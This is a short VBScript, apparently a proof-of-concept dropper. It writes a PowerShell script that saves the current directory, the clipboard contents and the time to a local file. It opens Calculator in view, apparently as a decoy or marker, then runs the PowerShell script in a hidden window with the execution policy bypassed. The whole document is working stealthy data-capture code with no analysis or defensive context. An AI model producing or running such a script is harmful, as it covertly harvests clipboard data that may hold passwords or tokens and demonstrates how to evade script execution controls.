Dim objShell, tempFile
Set objShell = CreateObject("WScript.Shell")

Set fso = CreateObject("Scripting.FileSystemObject")
Set file = fso.CreateTextFile("out.ps1", True)

file.WriteLine("$moz = 'Location : ' + (Get-Location) + ' Clipboard : ' + (Get-Clipboard) + ' Time : ' + (Get-Date -Format 'HH:mm:ss')")
file.WriteLine("$moz | Out-File -FilePath 'out.txt' -Encoding utf8")
file.Close
objShell.Run "calc.exe", 1, False
objShell.Run "powershell.exe -ExecutionPolicy Bypass -File """ & "out.ps1" & """", 0, True

Set file = Nothing
Set fso = Nothing
Set objShell = Nothing
